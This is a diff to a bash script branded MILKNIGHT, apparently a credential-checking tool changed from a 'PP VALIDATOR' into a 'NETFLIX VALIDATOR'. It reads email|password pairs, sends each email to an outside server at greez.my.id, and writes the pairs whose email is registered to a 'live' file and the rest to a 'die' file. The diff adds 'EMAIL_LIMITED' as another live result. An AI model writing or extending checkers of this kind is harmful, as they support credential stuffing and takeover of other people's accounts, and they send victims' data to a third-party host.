@@ -17,7 +17,7 @@ clear
 printf "${lightgreen}"
 cat << MILKNIGHT
  
-https://greez.my.id
+https://beta.milknight.com
 ======================================================================
   __  __   ___   _       _  __  _   _   ___    ____   _   _   _____ 
  |  \/  | |_ _| | |     | |/ / | \ | | |_ _|  / ___| | | | | |_   _|
@@ -26,7 +26,7 @@ https://greez.my.id
  |_|  |_| |___| |_____| |_|\_\ |_| \_| |___|  \____| |_| |_|   |_|  
                                                                     
                                                    
-=========================[ PP VALIDATOR ]=========================                             
+=========================[ NETFLIX VALIDATOR ]=========================                             
  
  
 MILKNIGHT
@@ -37,14 +37,17 @@ function ngecek(){
     local listsnya="${white}${1}|${2}${cbg}"
   local datentime0912930123="${yellow}[$(date +"%T")]"
     local result=$(curl -s "https://greez.my.id/Dit.php?net=${1}")
-    if [[ $result =~ "EMAIL_VALID" ]]; then
+    if [[ $result =~ '"EMAIL_VALID"' ]]; then
        printf "${CC} [${3}/${4}] ${datentime0912930123} |${listsnya} => ${bgreen}${B}LIVE${CC} \n"
         echo "${1}|${2}" >> GREEZ/live.txt
-    elif [[ $result =~ "EMAIL_UNREGISTERED" ]]; then
+    elif [[ $result =~ '"EMAIL_LIMITED"' ]]; then
+        printf "${CC} [${3}/${4}] ${datentime0912930123} |${listsnya} => ${bgreen}${B}LIVE${CC}\n"
+        echo "${1}|${2}" >> GREEZ/live.txt
+    elif [[ $result =~ '"EMAIL_UNREGISTERED"' ]]; then
         printf "${CC} [${3}/${4}] ${datentime0912930123} |${listsnya} => ${bgred}${B}DEAD${CC}\n"
         echo "${1}|${2}" >> GREEZ/die.txt
     else
-        printf "${CC} [${3}/${4}] ${datentime0912930123} |${listsnya} => ${CY}${B}UNKNW${CC}\n"
+        printf "${CC} [${3}/${4}] ${datentime0912930123} |${listsnya} ${CC}\n"
     fi
 }
  
